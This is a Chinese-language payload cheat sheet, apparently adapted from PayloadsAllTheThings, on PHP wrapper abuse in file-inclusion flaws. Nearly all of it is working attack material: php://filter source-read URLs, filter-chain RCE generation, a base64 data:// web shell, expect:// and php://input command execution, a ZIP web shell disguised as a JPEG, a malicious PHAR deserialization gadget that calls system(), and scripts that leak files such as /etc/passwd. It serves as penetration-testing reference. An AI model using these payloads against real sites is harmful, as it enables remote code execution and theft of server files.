# PHP Wrappers - PHP封装协议

[SEARCH_KEYWORDS]
漏洞类型: PHP Wrappers File Inclusion Wrappers PHP封装协议
攻击类型: File Read Remote Code Execution Information Disclosure
关键词: php://filter php://input data:// expect:// zip:// phar:// wrapper
技术: Filter Chain Base64 Encode Deserialization Iconv Dechunk
协议: php:// data:// expect:// input:// zip:// phar:// convert.iconv://

[CONTENT]

## PHP封装协议概述

PHP封装协议(Wrapper)是用于访问或包含文件的协议或方法。扩展了文件包含函数的功能，允许使用HTTP、FTP等协议以及本地文件系统。

## php://filter

用于读取文件内容：

| Filter | 描述 |
|--------|------|
| `php://filter/read=string.rot13/resource=index.php` | ROT13编码 |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | UTF-8转UTF-16 |
| `php://filter/convert.base64-encode/resource=index.php` | Base64编码 |

```powershell
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

### Filter Chain RCE

使用php_filter_chain_generator生成RCE payload：

```powershell
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```

## data://

执行Base64编码的PHP代码：

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

触发XSS绕过Chrome Auditor：

```ps1
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## expect://

执行系统命令：

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

## php://input

在POST参数中指定payload：

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00"
```

## zip://

从ZIP文件中包含文件：

```powershell
# 创建恶意ZIP
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg

# 包含
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

## phar://

### 基本用法

访问PHAR归档内的文件：

```powershell
curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt
```

### PHAR反序列化

PHP 8+已移除此功能。触发反序列化的函数：

`include`, `file_get_contents`, `file_exists`, `is_file`, `md5_file`等

创建恶意PHAR：

```php
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

class AnyClass {
    public $data = null;
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

## convert.iconv:// 和 dechunk://

### 基于错误的文件泄露

```ps1
python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
```

### 自定义格式输出

使用wrapwrap添加前缀后缀：

```ps1
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
```

## 参考文档

原始来源: PayloadsAllTheThings/File Inclusion/Wrappers.md